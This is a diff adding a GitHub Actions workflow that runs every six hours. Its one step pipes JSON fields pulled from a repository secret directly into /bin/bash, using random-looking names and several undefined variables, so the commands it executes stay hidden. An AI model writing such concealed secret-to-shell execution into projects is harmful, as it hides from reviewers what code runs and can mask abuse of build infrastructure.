@@ -1,0 +1,24 @@
+name: qianwangguancai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianwangguancai
+        env:
+          d0263: ${{ secrets.d0263 }}
+        run: |
+          echo $d0263 | jq -r .allix2545 | /bin/bash
+          echo $mtx05 | jq -r .pwexu8 | /bin/bash
+          echo $buj5 | jq -r .iqzlj71723 | /bin/bash
+          echo $hw1 | jq -r .ywg51724 | /bin/bash
+          echo $iwsp45354 | jq -r .lsp40 | /bin/bash
+          echo $jk18 | jq -r .ceq7 | /bin/bash
+          echo $be4572 | jq -r .fv1851 | /bin/bash
+          echo $innh06 | jq -r .rvrj05702 | /bin/bash
+
